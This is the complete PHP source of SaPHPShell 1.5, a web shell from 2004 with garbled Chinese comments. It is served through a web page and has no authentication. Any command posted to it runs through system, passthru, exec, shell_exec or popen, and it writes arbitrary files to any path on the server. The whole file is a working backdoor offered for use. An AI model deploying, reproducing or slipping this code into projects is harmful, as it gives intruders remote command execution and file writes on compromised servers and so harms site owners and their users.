   <?php
   /*
   +--------------------------------------------------------------------------+
   | SaPHPShell Version 1.5                                                   |
   | This script can be create any text files if the directory allow to write |
   | If Safe_mode is turn off, you can execute some system command            |
   | ======================================================================== |
   | Codz by Angel                                                            |
   | (c) 2004 Security Angel Team                                             |
   | http://www.4ngel.net                                                     |
   | ======================================================================== |
   | Web: http://www.4ngel.net                                                |
   | Email: 4ngel@21cn.com                                                    |
   | Date:  July 22st(My mother's birthday), 2004                             |
   +--------------------------------------------------------------------------+
   */
   error_reporting(7);
   // ÔÊÐí³ÌÐòÔÚ register_globals = off µÄ»·¾³ÏÂ¹¤×÷
   if ( function_exists('ini_get') ) {
       $onoff = ini_get('register_globals');
   } else {
       $onoff = get_cfg_var('register_globals');
   }
   if ($onoff != 1) {
       @extract($_POST, EXTR_SKIP);
   }

   // È¥³ý×ªÒå×Ö·û
   // ¿ÉÒÔ½â¾ömagic_quotes_gpcµÄÏÞÖÆ
   function stripslashes_array(&$array) {
       while (list($key,$var) = each($array)) {
           if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
               if (is_string($var)) {
                   $array[$key] = stripslashes($var);
               }
               if (is_array($var))  {
                   $array[$key] = stripslashes_array($var);
               }
           }
       }
       return $array;
   }

   // ÅÐ¶ÏÄ¿Â¼È¨ÏÞ
   function dir_writeable($dir) {
       if (!is_dir($dir)) {
           @mkdir($dir, 0777);
       }
       if(is_dir($dir)) {
           if ($fp = @fopen("$dir/test.test", 'w')) {
               @fclose($fp);
               @unlink("$dir/test.test");
               $writeable = 1;
           } else {
               $writeable = 0;
           }
       }
       return $writeable;
   }

   // ÅÐ¶Ï magic_quotes_gpc ×´Ì¬
   if (get_magic_quotes_gpc()) {
       $_POST = stripslashes_array($_POST);
   }

   // ÅÐ¶ÏÄ¿Â¼È¨ÏÞ
   if (dir_writeable(str_replace('\\','/',dirname(__FILE__)))) {
       $dir_writeable = '¿ÉÐ´';
   } else {
       $dir_writeable = '²»¿ÉÐ´';
   }

   // Ö´ÐÐ²Ù×÷
   if ($_POST['action']=="create") {
       if (file_exists($_POST['filename'])) {
           echo "<script>alert(\"ÎÄ¼þÒÑ´æÔÚ\")</script>";
           echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$_SERVER['PHP_SELF']."\">";
           exit;
       } else {
           $fp=@fopen("".$_POST['filename']."","wb");
           $content = $_POST['filedate'];
           $fw=@fwrite($fp,$content);
           if ($fw) {
               echo "<script>alert(\"Ð´ÈëÎÄ¼þ³É¹¦£¡\")</script>";
           } else {
               echo "<script>alert(\"Ð´ÈëÎÄ¼þÊ§°Ü£¡\")</script>";
           }
           @fclose($fp);
       }
   }
   ?>
   <html>
   <head><title>SaPHPShell Version 1.0</title>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312";>
   <STYLE type="text/css">
   body {font-family: "Courier New", "Verdana", "Tahoma"; font-size: 12px;}
   td {font-family: "Courier New", "Verdana", "Tahoma"; font-size: 12px;}
   input {font-family: "Courier New", "Verdana", "Tahoma";font-size: 12px;}
   .title {font-family: "Verdana", "Tahoma";font-size: 22px;font-weight: bold;}
   textarea {font-family: "Courier New", "Verdana", "Tahoma";font-size: 12px;}
   </STYLE>
   </head>
   <body>
   <table width="100%" border="0" cellspacing="1" cellpadding="3">
     <tr>
       <td class="title">SaPHPShell</td>
       <td align="right" valign="bottom"><font color="#FF0000"><?php echo "µ±Ç°²Ù×÷ÏµÍ³: ".PHP_OS."<br>";?></font></td>
     </tr>
   </table>
   <hr>
   <?php
   if (!get_cfg_var("safe_mode")){
   ?>
       <table width="100%" border="0" cellspacing="1" cellpadding="3">
        <form action="<?=$PHP_SELF?>" method="post">
         <tr>
          <td>Ñ¡ÔñÖ´ÐÐº¯Êý:</td>
         </tr>
         <tr>
          <td><select name="execfunc" class="input">
           <option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option>
           <option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
           <option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
           <option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
           <option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
         </select></td>
         </tr>
         <tr>
          <td>ÃüÁî:</td>
         </tr>
         <tr>
          <td><input type="text" name="command" size="60" value="<?=$_POST['command']?>">
         <input type="submit" value="execute"> ×¢Òâ£º²¿·ÖÃüÁî¿ÉÄÜÓÐÏÞÖÆ</td>
         </tr>
         <tr>
          <td>Êä³ö:</td>
         </tr>
         <tr>
          <td><textarea name="textarea" cols="100" rows="25" readonly><?php
       if (!empty($_POST['command'])) {
           if ($execfunc=="system") {
               system($_POST['command']);
           } elseif ($execfunc=="passthru") {
               passthru($_POST['command']);
           } elseif ($execfunc=="exec") {
               $result = exec($_POST['command']);
               echo $result;
           } elseif ($execfunc=="shell_exec") {
               $result=shell_exec($_POST['command']);
               echo $result;
           } elseif ($execfunc=="popen") {
               $pp = popen($_POST['command'], 'r');
               $read = fread($pp, 2096);
               echo $read;
               pclose($pp);
           } else {
               system($_POST['command']);
           }
       }
       ?></textarea></td>
         </tr>
       </form>
      </table>
       <hr>
   <?php
   }
   ?>
   <table width="100%" border="0" cellspacing="1" cellpadding="3">
    <form action="<?=$PHP_SELF?>" method="post">
     <tr>
       <td>µ±Ç°Ä¿Â¼£¨<font color="#ff0000"><?=$dir_writeable?></font>£©:
       <?=str_replace('\\','/',dirname(__FILE__))?>
       </td>
     </tr>
     <tr>
       <td>&nbsp;</td>
     </tr>
     <tr>
       <td>ÊäÈë½«Òª±£´æµÄÎÄ¼þÃû£¬Ö§³ÖÏà¶ÔÂ·¾¶¡¢¾ø¶ÔÂ·¾¶£¬ÎÞÂ·¾¶Ôò±£´æÔÚµ±Ç°Ä¿Â¼¡£</td>
     </tr>
     <tr>
       <td><input type="text" name="filename" size="60"></td>
     </tr>
     <tr>
       <td>ÎÄ¼þÄÚÈÝ:</td>
     </tr>
     <tr>
       <td><textarea name="filedate" cols="80" rows="15"></textarea></td>
     </tr>
     <tr>
       <td><input type="hidden" name="action" value="create">
         <input name="submit" type="submit" value="Éú³É">
   </td>
     </tr>
    </form>
   </table>
   <hr>
   <i>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved. Get the latest version at <a
   href="http://www.4ngel.net" target="_blank">www.4ngel.net</a>.<br>
   Powered by SaPHPShell Version 1.5</i>
   </body>
   </html>
